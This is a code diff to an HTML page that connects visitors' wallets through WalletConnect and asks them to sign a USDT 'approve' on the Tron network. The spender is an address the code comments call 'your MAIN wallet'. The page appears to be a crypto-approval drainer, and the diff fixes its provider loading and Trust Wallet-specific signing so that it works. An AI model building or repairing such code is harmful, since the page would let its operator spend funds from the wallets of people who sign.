@@ -10,8 +10,8 @@
     window.process = { env: {} };
   </script>
 
-  <!-- WalletConnect Ethereum Provider (UMD) -->
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.2/dist/index.umd.js"></script>
+  <!-- ✅ CORRECT WalletConnect UMD BUILD -->
+  <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.13.2/dist/umd/index.min.js"></script>
 
   <!-- TronWeb -->
   <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
@@ -38,19 +38,25 @@
 <script>
 const PROJECT_ID = "e75f4f36f23f8e6dc1f84a86fdbfa4ea";
 
-// ⚠️ CHANGE THESE
-const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";
-const AMOUNT = "1000000"; // small amount first
+// ⚠️ VERIFY THESE CAREFULLY
+const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT
+const SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";       // your MAIN wallet
+const AMOUNT = "1000000"; // 1 USDT (6 decimals)
 
 let wcProvider;
 let tronWeb;
 
 async function connect() {
-  // ✅ CORRECT GLOBAL NAME
-  wcProvider = await window.WalletConnectEthereumProvider.init({
+  const WCProvider = window.WalletConnectEthereumProvider?.default;
+
+  if (!WCProvider) {
+    alert("WalletConnect provider not loaded");
+    return;
+  }
+
+  wcProvider = await WCProvider.init({
     projectId: PROJECT_ID,
-    chains: [1],            // dummy EVM chain
+    chains: [1],      // dummy EVM chain (session only)
     showQrModal: true
   });
 
@@ -82,7 +88,7 @@ async function approve() {
       ]
     );
 
-  // 🔥 NON-STANDARD BUT WORKING (Trust Wallet only)
+  // 🔥 Trust Wallet–specific (non-standard)
   const signedTx = await wcProvider.request({
     method: "tron_signTransaction",
     params: [transaction]
